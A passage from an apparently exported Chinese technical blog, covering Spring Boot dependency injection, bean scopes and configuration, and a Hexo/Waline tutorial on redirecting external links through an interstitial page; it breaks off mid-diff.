<li>依赖注入：Dependency Injection，简称 Dl。容器为应用程序提供运行时，所依赖的资源，称之为依赖注入。</li>
<li>Bean 对象：IOC 容器中创建、管理的对象，称之为 bean。</li>
</ul>
<h1>IOC/DI 的使用</h1>
<p>基础使用：</p>
<ul>
<li><code>@Component</code>：将当前类（Service 层、Dao 层）交给 IOC 容器管理，成为 IOC 容器中的 bean。实现控制反转。</li>
<li><code>@Autowired</code>：（为 Controller 和 Service 注入）运行时，IOC 容器会提供该类型的 bean 对象，并赋值给该变量。实现依赖注入。</li>
</ul>
<blockquote>
<p>所以说，切换业务实现类时，直接把需要用的实现类上加上 <code>@Component</code> 就行。</p>
</blockquote>
<p>SpringBoot 中 Bean 的声明：</p>
<table>
<thead>
<tr>
<th>注解</th>
<th>说明</th>
<th>位置</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>@Component</code></td>
<td>声明 bean 的基础注解</td>
<td>不属于以下三类时，用此注解（比如一些工具类）</td>
</tr>
<tr>
<td><code>@Controller</code></td>
<td><code>@Component</code> 的衍生注解</td>
<td>标注在控制器类上</td>
</tr>
<tr>
<td><code>@Service</code></td>
<td><code>@Component</code> 的衍生注解</td>
<td>标注在业务类上</td>
</tr>
<tr>
<td><code>@Repository</code></td>
<td><code>@Component</code> 的衍生注解</td>
<td>标注在数据访问类上（由于与 mybatis 整合，用的少）</td>
</tr>
</tbody>
</table>
<p>声明 bean 的时候，可以通过 value 属性指定 bean 的名字，如果没有指定，默认为类名首字母小写。</p>
<p>使用以上四个注解都可以声明 bean，但是在 Springboot 集成 web 开发中，声明控制器 bean 只能用 <code>@Controller</code>。</p>
<blockquote>
<p><code>@RestController</code> 中包含 <code>@Controller</code> 注解。</p>
</blockquote>
<p>Bean 组件扫描：</p>
<ul>
<li>前面声明 bean 的四大注解，要想生效，还需要被组件扫描注解 <code>@Componentscan</code> 扫描。<code>@ComponentScan</code> 注解虽然没有显式配置，但是实际上已经包含在了启动类声明注解 <code>@SpringBootApplication</code> 中，默认扫描的范围是启动类所在包及其子包。</li>
<li>【不推荐】我们可以在启动类上增加 <code>@ComponentScan</code> 注解，手动设置扫描包的范围。注意检查有没有覆盖掉默认的薮猫范围，可以自己手动添加上。</li>
</ul>
<p>Bean 注入：</p>
<ul>
<li><code>@Autowired</code> 注解，默认是按照类型进行。也就是在 IOC 容器中找这个类型的 Bean 对象然后再注入。</li>
<li>如果存在多个相同类型的 bean，将会报错，可以使用以下方案解决：
<ul>
<li><code>@Primary</code>。在 Bean 上面再加上这个注解，可以让该 Bean 优先生效。</li>
<li><code>@Autowired</code>+<code>@Qualifier(&quot;&lt;beanName&gt;&quot;)</code>。使该名字的 Bean 生效。</li>
<li><code>@Resource(name=&quot;&lt;beanName&gt;&quot;)</code>。使该名字的 Bean 生效。</li>
</ul>
</li>
</ul>
<blockquote>
<p>[!example] 【高频面试题】<code>@Resource</code> 与 <code>@Autowired</code> 区别：</p>
<ul>
<li><code>@Autowired</code> 是 Spring 框架提供的注解，而 <code>@Resource</code> 是 JDK 提供的注解，</li>
<li><code>@Autowired</code> 默认是按照类型注入，而 <code>@Resource</code> 默认是按照名称注入。</li>
</ul>
</blockquote>
<h1>示例工程</h1>
<p>一个工程目录示例：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240508230449.webp" alt="image.png|350"></p>
<p>示例 Mapper：</p>
<pre><code class="language-java">@Mapper
public interface DeptMapper{
	// 基于注解方式编写SQL语句
	@Select(&quot;select * from user&quot;)
	List&lt;dept&gt; list();
}
</code></pre>
<p>示例 Service 接口类：</p>
<pre><code class="language-java">public interface DeptService{
	List&lt;Dept&gt; list();
}
</code></pre>
<p>示例 Service 的实现类：</p>
<pre><code class="language-java">@Service
public class DeptServiceImpl implements DeptService{
	// 注入Mapper
	@Autowired
	private DeptMapper deptMapper;

	// 实现接口
	@Override
	public List&lt;Dept&gt; list(){
		return deptMapper.list();
	}
}
</code></pre>
<p>示例 Controller 的写法：</p>
<pre><code class="language-java">@Slf4j // 使用日志
@RestController
public class DeptController{
	// @Slf4j 将省略下面这一行
	// private static Logger log = LoggerFactory.getLogger(DeptController.class);

	// Service的注入
	@Autowired
	private DeptService deptService;

	// @GetMapping 作用和下面这条相同
	// @RequestMapping(vaue = &quot;/depts&quot;,method = RequestMethod.GET)
	@GetMapping(&quot;/depts&quot;)
	public Result list(){
		log.info(&quot;查询部门数据&quot;);
		List&lt;Dept&gt; deptList = deptService.list();
		return Result.success(deptList); // 结果类Result是自己定义的
	}
}
</code></pre>
<h1>Bean 管理</h1>
<h2>获取 Bean</h2>
<pre><code class="language-java">// 拿到 IOC 容器的方法
@Autowired
private ApplicationContext applicationContext; // IOC容器对象
</code></pre>
<p><strong>默认情况下</strong>，Spring 项目启动时，会把 bean 都创建好放在 IOC 容器中 [^ioc]，如果想要<strong>主动</strong>获取这些 bean，可以通过如下方式使用 <code>ApplicationContext</code> 的方法：</p>
<ul>
<li>根据 name 获取 bean：<code>Object getBean(String name)</code></li>
<li>根据类型获取 bean：<code>&lt;T&gt; T getBean(Class&lt;T&gt; requiredType)</code></li>
<li>根据 name 获取 bean（带类型转换）：<code>&lt;T&gt; T getBean(String name, Class&lt;T&gt; requiredType)</code></li>
</ul>
<p>[^ioc]: 这还会受到作用域及延迟初始化影响，这里主要针对于默认的单例非延迟加载的 bean 而言。</p>
<p>示例：</p>
<pre><code class="language-java">@SpringBootTest
class ApplicationTests{

	@Autowired
	private ApplicationContext applicationContext; // IOC容器对象
	
	@Test
	public void testGetBean(){
	
	//根据bean的名称获取
	DeptController bean1 = (DeptController) applicationContext.getBean(&quot;deptController&quot;);
	System.out.println(bean1);
	
	//根据bean的类型获取
	DeptController bean2 = applicationContext.getBean(DeptController.class);
	System.out.println(bean2);
	
	//根据bean的名称及类型获取
	DeptController bean3 = applicationContext.getBean(&quot;deptController&quot;,DeptController.class);
	System.out.println(bean3);
}
</code></pre>
<p>输出结果发现三个 bean 对象都是同一个对象，说明此时 bean 是单例的。</p>
<h2>Bean 的作用域</h2>
<p>Spring 支持五种作用域，后三种在 web 环境才生效：</p>
<table>
<thead>
<tr>
<th>作用域</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>singleton</code></td>
<td>容器内同名称的 bean 只有一个实例（单例）（默认）</td>
</tr>
<tr>
<td><code>prototype</code></td>
<td>每次使用该 bean 时会创建新的实例（非单例）</td>
</tr>
<tr>
<td><code>request</code></td>
<td>每个请求范围内会创建新的实例（web 环境中，了解即可）</td>
</tr>
<tr>
<td><code>session</code></td>
<td>每个会话范围内会创建新的实例（web 环境中，了解即可）</td>
</tr>
<tr>
<td><code>application</code></td>
<td>每个应用范围内会创建新的实例（web 环境中，了解即可）</td>
</tr>
</tbody>
</table>
<p>可以通过 <code>@Scope</code> 注解来进行配置作用域：<code>@Scope(&quot;prototype&quot;)</code>。</p>
<p>默认 <code>singleton</code> 的 bean，在容器启动时被创建，可以使用 <code>@Lazy</code> 注解来延迟初始化（延迟到第一次使用时），<code>prototype</code> 的 bean，每一次使用该 bean 的时候都会创建一个新的实例。</p>
<p>实际开发当中，绝大部分的 Bean 是单例的，也就是说绝大部分 Bean 不需要配置 scope 属性。</p>
<h2>第三方 Bean</h2>
<p>如果要管理的 bean 对象来自于第三方（不是自定义的），是无法用 <code>@Component</code> 及衍生注解声明 bean 的（第三方某些类的源码定义中我们无法改动），就需要用到 <code>@Bean</code> 注解。若要管理的第三方 bean 对象，建议对这些 bean 进行集中分类配置，可以通过 <code>@Configuration</code> 注解声明一个配置类。</p>
<blockquote>
<p><code>@Configuration</code> 底层也是 <code>@Component</code>。</p>
</blockquote>
<pre><code class="language-java">// 方法一：【不推荐】定义在启动类中
// 这样导致启动类不纯粹
@SpringBootApplication
public class SpringbootWebConfig2Application{
	@Bean //将方法返回值交给IOC容器管理，成为IOC容器的bean对象
	public MyBean myBean(){
		return new MyBean();
	}
}

// 方法二：声明一个配置类
// 通过@Bean注解的name/value属性指定bean名称，如果未指定，默认是方法名
@Configuration
public class CommonConfig{
	@Bean
	public MyBean myBean(){
		return new MyBean();
	}
}
</code></pre>
<p>使用 Bean 时直接注入即可：</p>
<pre><code class="language-java">@Autowired
private MyBean mybean;
</code></pre>
<p>如果第三方 bean 需要依赖其它 bean 对象，直接在 bean 定义方法中设置形参即可，容器会根据类型自动装配。</p>
<pre><code class="language-java">@Configuration
public class CommonConfig{

	// SpringBoot容器会根据参数类型MyService自动装配Bean对象
	@Bean
	public MyBean myBean(MyService myService){
		// 省略一些使用myService的操作
		return new MyBean();
	}
}
</code></pre>
<p><code>@Component</code> 及衍生注解与 <code>@Bean</code> 注解使用场景?</p>
<ul>
<li>项目中自定义的，使用 <code>@Component</code> 及其衍生注解</li>
<li>项目中引入第三方的，使用 <code>@Bean</code> 注解</li>
</ul>
<h1>后记</h1>
<p>下面你可以立即移步这篇文章加深上面所学知识的印象：<a href="#565697069" title="SpringBoot 的原理以及写一个自定义 Starter" class="record-link ">SpringBoot 的原理以及写一个自定义 Starter</a>。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=75&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">Day05-09. 分层解耦-三层架构_哔哩哔哩_bilibili</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="565697069">
                            <a href="#565697069">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 的原理以及写一个自定义 Starter</span>
                                
                                <div class="record-links-context hover">
                                    <p>下面你可以立即移步这篇文章加深上面所学知识的印象：<a href="#565697069" title="SpringBoot 的原理以及写一个自定义 Starter" class="record-link highlight">SpringBoot 的原理以及写一个自定义 Starter</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="565697069">
                            <a href="#565697069">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 的原理以及写一个自定义 Starter</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!hint] <code>@Configuration</code> 注解<br>
告诉 Spring Boot 这是一个配置类，可以在该类中创建 Bean。更多声明第三方 Bean 细节详看：<a href="#1713466548" title="SpringBoot 中的 IOC & DI 入门" class="record-link highlight">SpringBoot 中的 IOC &amp; DI 入门</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2487324783" class="record">
            <header>
                <h1 class="record-title">SpringBoot 中的配置</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/3/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240723234813.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>9441906f</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>SpringBoot 最基础的读取配置的方式备忘。</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>配置文件</h1>
<p>SpringBoot 配置文件为：</p>
<ul>
<li><code>application.properties</code>。形式：<code>main_key.sub=value</code>。不能写注释。</li>
<li>【推荐】<code>application.yml</code>，<code>application.yaml</code>。格式采用 YAML 格式，可以写注释。</li>
</ul>
<p>外部配置的属性注入方法：</p>
<ul>
<li>使用 <code>@Value</code> 注解通常用于外部配置的属性注入，具体用法为：<code>@Value(&quot;${配置文件中的key}&quot;)</code>。</li>
<li>但是遇到复杂参数名的话，其注解可能会比较长且繁琐。我们可以使用 <code>@ConfigurationProperties</code> 简化开发。</li>
</ul>
<p><code>@Value</code> 和 <code>@ConfigurationProperties</code> 的不同点：</p>
<ul>
<li><code>@Value</code> 注解只能一个一个的进行外部属性的注入。</li>
<li><code>@ConfigurationProperties</code> 可以批量的将外部的属性配置注入到 bean 对象的属性中。</li>
</ul>
<h2>示例</h2>
<pre><code class="language-yaml"># application.yml
key:
	sub:
		sub1: abc
		sub2: cdf
</code></pre>
<p><code>@Value</code> 方式：</p>
<pre><code class="language-java">@Component
public class SomeoneClass{
	@Value(&quot;${key.sub.sub1}&quot;)
	private String sub1;	
	@Value(&quot;${key.sub.sub2}&quot;)
	private String sub2;
}
</code></pre>
<p>使用 <code>@ConfigurationProperties</code> 方式，注意成员变量的命名要和配置文件中的键名对应：</p>
<pre><code class="language-java">// 新建一个配置类
@Data // Lombok
@Component // 添加到IOC容器中
@ConfigurationProperties(prefix = &quot;key.sub&quot;)
public class MyKeyProperties{
	private String sub1;	// 注意：名称要和配置文件中的键名对应
	private String sub2;
}

//------ 使用方法 ---------
public class SomeoneClass{
	@Autowired // 注入
	private MyKeyProperties myKeyProperties;

	String sub1 = myKeyProperties.getSub1(); // Lombok 提供类get方法
	String sub2 = myKeyProperties.getSub2();
}
</code></pre>
<p>可选操作：<code>pom.xml</code> 引入以下依赖，用于帮助 IDEA 识别 <code>@ConfigurationProperties</code> 中的 prefix，消去 IDEA 的警告，并且 IDEA 提供配置的自动补全。</p>
<pre><code class="language-xml">&lt;dependency&gt;
	&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
	&lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<p>这个依赖安装与否都不影响程序的正确运行。</p>
<h1>配置方式</h1>
<p>SpringBoot 除了支持配置文件属性配置，还支持 Java 系统属性和命令行参数的方式进行属性配置。</p>
<ul>
<li>Java 系统属性：<code>-Dserver.port=9000</code>。
<ul>
<li>IDEA 中在 Run/Debug Configurations -&gt; 你的 Spring 项目 -&gt;VM options 中配置。</li>
<li>java 指令运行 jar 包：<code>java -Dserver.port=9000 -jar your.jar</code></li>
</ul>
</li>
<li>命令行参数：<code>--server.port=10010</code>。
<ul>
<li>IDEA 中在 Run/Debug Configurations -&gt; 你的 Spring 项目 -&gt; Program arguments 中配置</li>
<li>java 指令运行 jar 包：<code>java -jar your.jar --server.port=10010</code></li>
</ul>
</li>
</ul>
<blockquote>
<p>SpringBoot 同时启动多项目： <a href="https://blog.csdn.net/weixin_44606481/article/details/132694434">https://blog.csdn.net/weixin_44606481/article/details/132694434</a></p>
</blockquote>
<blockquote>
<p>[!hint] SpringBoot 项目打包操作依赖<br>
进行打包时需要引入 <code>spring-boot-maven-plugin</code>。不过基于官方骨架创建项目，会自动添加这个插件。</p>
</blockquote>
<p>关于 SpringBoot 项目的部署方式详见本站文章：<a href="#2985240736" title="SpringBoot 项目的上线方式" class="record-link ">SpringBoot 项目的上线方式</a>。</p>
<h1>配置优先级</h1>
<p>多个配置文件同时存在时，配置文件优先级从高到低依次为：</p>
<ul>
<li><code>application.properties</code></li>
<li><code>application.yml</code></li>
<li><code>application.yaml</code></li>
</ul>
<p>虽然 springboot 支持多种格式配置文件，但是在项目开发时，推荐统一使用一种格式的配置（yml 是主流）。</p>
<p>属性配置方式的优先级从高到低依次为：</p>
<ul>
<li>命令行参数</li>
<li>Java 系统属性</li>
</ul>
<p>五种配置方式的优先级从高到低依次为：</p>
<ol>
<li>命令行参数</li>
<li>Java 系统属性</li>
<li><code>application.properties</code></li>
<li><code>application.yml</code></li>
<li><code>application.yaml</code></li>
</ol>
<p>官方文档：<a href="https://springdoc.cn/spring-boot/features.html#features.external-config">核心特性 (springdoc.cn)</a></p>
<h1>更多</h1>
<p>关于读取配置文件更骚的操作详看本站文章：[[单例模式的应用——为 Java 程序应用全局配置]]</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=153&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">Day11-09. 案例-配置文件-参数配置化_哔哩哔哩_bilibili</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="2985240736">
                            <a href="#2985240736">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 项目的上线方式</span>
                                
                                <div class="record-links-context hover">
                                    <p>关于 SpringBoot 项目的部署方式详见本站文章：<a href="#2985240736" title="SpringBoot 项目的上线方式" class="record-link highlight">SpringBoot 项目的上线方式</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="565697069">
                            <a href="#565697069">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 的原理以及写一个自定义 Starter</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!hint] <code>@ConfigurationProperties</code> 注解<br>
和配置文件（比如 <code>application.yml</code>）进行绑定，将配置文件中对应的配置映射到对象的属性中。在这里是把配置文件 <code>myrandom.lenth</code> 中的值映射到 <code>MyRandomProperties</code> 对象的 <code>length</code> 中。详见：<a href="#2487324783" title="SpringBoot 中的配置" class="record-link highlight">SpringBoot 中的配置</a>。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3790495434" class="record">
            <header>
                <h1 class="record-title">Hexo 博客与 Waline 评论区实现外链跳转中间页</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('JavaScript');">JavaScript</button>
                    
                    <button class="btn" onclick="activeTag('HTML');">HTML</button>
                    
                    <button class="btn" onclick="activeTag('Waline');">Waline</button>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                    <button class="btn" onclick="activeTag('npm');">npm</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/4/2024</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>博客与评论区统一拦截重定向</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>e1ee5eca</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/202408042352584.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!note] 文章重要更新 <code>240804</code></p>
<ul>
<li><strong>新增 Waline 评论区中间页的实现</strong></li>
<li>加入 <a href="https://blog.qyliu.top/">@清羽飞扬</a> 的插件方案</li>
<li>原文章发表于 <code>240223</code></li>
</ul>
</blockquote>
<blockquote>
<p>由于开始创建这篇文件时（24 年 3 月）站长收到了 wxb 的温暖来电😨，所以自此以后对博客安全额外关注。好巧不巧那时在 <a href="https://uuanqin.top/pages/friend_circle/">友链朋友圈</a> 刷到类似文章，于是立刻开展学习并全站自查。</p>
</blockquote>
<p>本文主要构成：</p>
<ul>
<li><strong>Waline 评论区中间页的实现（新增）</strong>
<ul>
<li>方案 1：官方插件实现。但是有点小问题。</li>
<li>方案 2：使用博主自写插件，<strong>流畅配合 Hexo 中其他中间页插件</strong></li>
</ul>
</li>
<li>Hexo 博客外链跳转中间页的实现
<ul>
<li>方案 1： <a href="https://blog.qyliu.top/">@清羽飞扬</a> 的插件方案。</li>
<li>方案 2：博主原本的过渡方案。</li>
</ul>
</li>
</ul>
<h1>Waline 评论区实现外链跳转中间页</h1>
<blockquote>
<p>[!hint] 本文默认读者的 Waline 评论系统使用了 <strong>Vercel</strong> 部署方式。</p>
</blockquote>
<p>Waline 评论区独立于 Hexo 博客，是一个另外的系统，因此 Hexo 的插件管理不到 Waline 的内容。我们可以通过安装 Waline 评论区的插件实现评论中的外链拦截。</p>
<p>Waline 的插件不多，但是 Waline 维护者本人还是写了个相关的插件：<a href="https://github.com/walinejs/plugins/tree/master/packages/link-interceptor">plugins/packages/link-interceptor at master · walinejs/plugins (github.com)</a></p>
<h2>方案一：使用 Waline 官方提供的插件</h2>
<blockquote>
<p>[!warning] 该插件为 Waline 的官方实现，但目前仍存在问题。建议往下看 <strong>方案二</strong> 。</p>
</blockquote>
<h3>安装</h3>
<p><code>git clone</code> 你的 waline 后端。进入项目，安装 npm 包：</p>
<pre><code class="language-sh">npm i @waline-plugins/link-interceptor
</code></pre>
<p>按照官方示例在 <code>index.js</code> 中添加对应代码：</p>
<pre><code class="language-javascript">const Application = require('@waline/vercel');
const LinkInterceptor = require('@waline-plugins/link-interceptor'); // 增加这一条

module.exports = Application({
  // ...这里省略你以前写的东西

  // 插件
  plugins: [
    LinkInterceptor({
      whiteList: ['uuanqin.top'],  // 白名单
      blackList: [],  // 黑名单
      // interceptorTemplate: `redirect to __URL__ `  // 这是中间页的模板，__URL__会被替换为匹配到的url
    })
  ]
});
</code></pre>
<p><code>interceptorTemplate</code> 选项不写的话，官方默认的模板为：</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;title&gt;Redirect to third party website&lt;/title&gt;&lt;/head&gt;&lt;body data-url=&quot;__URL__&quot;&gt;&lt;p&gt;Redirecting to __URL__&lt;/p&gt;&lt;script&gt;location.href = document.body.getAttribute('data-url');&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>
<h3>部署与测试</h3>
<p>将下面的文件加到 <code>.gitignore</code> 文件中：</p>
<ul>
<li>刚才安装插件新增的 <code>node_modules</code> 文件夹</li>
<li>新增的 <code>package-lock.json</code></li>
</ul>
<p>然后 <code>git add</code> 以下文件（也就是说只有以下三个文件发生了改动）：</p>
<ul>
<li>你刚刚改动的 <code>index.js</code></li>
<li>下载插件后自动变化的 <code>package.json</code></li>
</ul>
<p>最后 <code>git commit</code> 并上传。上传成功后 Vercel 会自动重新部署后端。</p>
<p>你可以发表评论进行测试。比如 <code>blackList</code> 中包含 <code>baidu.com</code>，那么评论内容出现相关域名链接时将替换链接为插件指定的中间页地址~~，并展示指定模板~~。</p>
<details><summary><b>官方插件中存在的问题</b></summary>
<p>
<h4>黑白名单判断逻辑</h4>
<p>该插件的黑白名单判断逻辑：</p>
<pre><code class="language-javascript">function isValidUrl(url) {
	// ...
	return !inBlackList || inWhiteList;
}
</code></pre>
<p>也就是说它是黑名单优先的：</p>
<ul>
<li>如果网址不在黑名单，那就立马通过验证。</li>
<li>只有在黑名单且不在白名单才进行中间页拦截。</li>
</ul>
<p>此外，没有域名通配符逻辑。这样的效果似乎不是很好。</p>
<h4>中间页模板</h4>
<p>还有一点就是，官方插件中的模板功能并不成功。因为官方插件的函数 <code>outputHtml</code> 写错位置了（已提 <a href="https://github.com/walinejs/plugins/pull/13">PR</a>）。</p>
<p>理论上的效果如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/202408041813082.webp" alt="image.png"></p>
<p>上面的默认模板显示后，紧接着跳转到目标链接。</p>
</p>
</details>
<h2>方案二：自写插件</h2>
<p>针对官方插件中的不足，我对官方插件的逻辑进行改进：</p>
<ul>
<li>修复官方插件中的中间页模板不生效的问题</li>
<li>黑名单、白名单匹配规则更改</li>
<li>可以自定义跳转的中间页，以联合 Hexo 中的相关插件</li>
</ul>
<p><a href="https://github.com/uuanqin/waline-link-interceptor"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=waline-link-interceptor" alt="Readme Card"></a></p>
<p>项目地址：<a href="https://github.com/uuanqin/waline-link-interceptor?tab=readme-ov-file">uuanqin/waline-link-interceptor: A plugin of Waline Comment System which can add a intercept page for external links in comments. (github.com)</a></p>
<h3>安装</h3>
<p><code>git clone</code> 你的 waline 后端。进入项目，安装 npm 包：</p>
<pre><code class="language-sh">npm i waline-link-interceptor
</code></pre>
<h3>基本使用</h3>
<pre><code class="language-js">const Application = require('@waline/vercel');
const LinkInterceptor = require('waline-link-interceptor');

module.exports = Application({
  // 插件
  plugins: [
    LinkInterceptor({
      whiteList: [
        'uuanqin.top'
      ],
      // blackList: [],
      // interceptorTemplate: `hello __URL__ `,  // 这是中间页的模板（当不指定跳转链接时默认使用模板）
    })
  ]
});
</code></pre>
<p>用法和上面方案 1 官方插件的用法完全一样，并修复了 bug。此外，黑白名单的逻辑为：</p>
<ul>
<li>如果只填写白名单，那么不在白名单内的域名及其子域名，均将重定向至拦截页；</li>
<li>如果只填写黑名单，那么黑名单中的域名及其子域名，均将重定向至拦截页。其余链接放行；</li>
<li>如果黑白名单都填写，那么只拦截在黑名单中但不在白名单中的域名及其子域名。</li>
</ul>
<h3>部署与测试</h3>
<p>将下面的文件加到 <code>.gitignore</code> 文件中：</p>
<ul>
<li>刚才安装插件新增的 <code>node_modules</code> 文件夹</li>
<li>新增的 <code>package-lock.json</code></li>
</ul>
<p>然后 <code>git add</code> 以下文件（也就是说只有以下三个文件发生了改动）：</p>
<ul>
<li>你刚刚改动的 <code>index.js</code></li>
<li>下载插件后自动变化的 <code>package.json</code></li>
</ul>
<p>最后 <code>git commit</code> 并上传。上传成功后 Vercel 会自动重新部署后端。</p>
<h3>进阶使用 - 重定向至指定的链接</h3>
<p>有时候，我们并不想使用 waline 默认的跳转页，又或者自己另外在插件里通过 <code>interceptorTemplate</code> 字段写中间页模板。</p>
<p>如果我们已经有了现成的中间页网址，可不可以让外链跳转到指定的地址呢？答案是肯定的，这个插件提供修改中间页链接的可选项。</p>
<pre><code class="language-js">module.exports = Application({
  // 插件
  plugins: [
    LinkInterceptor({
      whiteList: [
        'uuanqin.top'
      ],
      // blackList: [],
      // interceptorTemplate: `hello __URL__ `,  // 如果下面自定义了跳转地址，那么此处模板不生效
      redirectUrl: &quot;https://example.com/go.html&quot;,
      encodeFunc: (url) =&gt;{
        return url;
      }
    })
  ]
});
</code></pre>
<p>比如我想让中间页地址形式为：</p>
<pre><code class="language-url">https://example.com/go.html?u=https://external-link.com
</code></pre>
<p>那么，参数填写</p>
<ul>
<li><code>redirectUrl</code> 填写中间页的具体 html 地址：<code>https://example.com/go.html</code></li>
<li><code>encodeFunc</code> 填入一个外链 url 的处理函数，应该为：</li>
</ul>
<pre><code class="language-js">encodeFunc: (url) =&gt;{
	return &quot;u=&quot;+url;
}
</code></pre>
<p>也就是说，问号前面的归 <code>redirectUrl</code> 管，问号后面的归 <code>encodeFunc</code> 管。</p>
<h4>更多示例</h4>
<p>如果你装了后文提到 Hexo 插件 <code>hexo-safego</code>，且该插件的相关配置（<code>_config.yml</code>）为：</p>
<pre><code class="language-yaml"># see https://blog.qyliu.top/posts/1dfd1f41/
hexo_safego:
  enable: true  # 是否启用 hexo-safego 插件
  enable_base64_encode: true  # 是否启用 Base64 编码链接
  enable_target_blank: true  # 是否在跳转链接中添加 target=&quot;_blank&quot;
  url_param_name: 'u'  # URL 参数名，用于生成跳转链接
  html_file_name: 'go.html'  # 跳转页面文件名
</code></pre>
<p>你可以这样填：</p>
<pre><code class="language-js">redirectUrl: &quot;https://your.blog.cn/go.html&quot;,
encodeFunc: (url) =&gt;{
	return &quot;u=&quot;+Buffer.from(url).toString('base64') // 启用 Base64 编码链接
}
</code></pre>
<p>这样就能 Waline 评论区 + Hexo 文章中间页跳转的无缝衔接啦！</p>
<h1>Hexo 博客文章外链跳转</h1>
<p>本文记录两种方案。</p>
<h2>方案一：安装页面跳转插件</h2>
<blockquote>
<p>[!success] 【推荐】本站目前使用的方案</p>
</blockquote>
<p>详见友链用户 <a href="https://blog.qyliu.top/">@清羽飞扬</a> 的文章：<a href="https://blog.qyliu.top/posts/1dfd1f41/">安全跳转页面·插件版</a>。</p>
<p>效果如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/202408041758490.webp" alt="image.png"></p>
<h2>方案二：魔改既有插件</h2>
<blockquote>
<p>[!warning] 本方案过期提示</p>
<ul>
<li>本小节临时过渡方案，已经完成了它的使命。</li>
<li>虽然方案实现麻烦且不优雅，但目前仍可继续工作。</li>
</ul>
</blockquote>
<p>本小节提供一个在 Hexo 实现的简单的方法，涉及到对插件源代码的修改（不优雅），但过渡时期可暂时容忍这一不足。我觉得整体思路是有参考性的。</p>
<h3>插件安装与调整</h3>
<p>安装插件的目的是，识别出所有的外部链接，并修改其 URL 的格式使之成为内部链接。URL 指向一个中间页（没错，就是我以前嗤之以鼻的「互联网壁垒」）。你可以选择其他方式完成这件事情（比如 Hugo 方案参考友链用户 <a href="https://www.eallion.com/">@大大的蜗牛</a> 的文章： <a href="https://www.eallion.com/hugo-redirect-landing-page/">Hugo 外部链接跳转提示页面</a>）</p>
<p>插件 <a href="https://github.com/hvnobug/hexo-external-link/tree/master">hvnobug/hexo-external-link (github.com)</a> 所做的就是这件事情。但是唯一缺点就是最终转换的链接不可定制，于是我就手动修改了一下源代码，即修改博客目录下 <code>blogs\node_modules\hexo-filter-links\lib\filter.js</code> 文件：</p>
<pre><code class="language-diff">- NewhrefStr = 'href=&quot;' + config.url + '/go/#' + NewhrefStr + '&quot;';
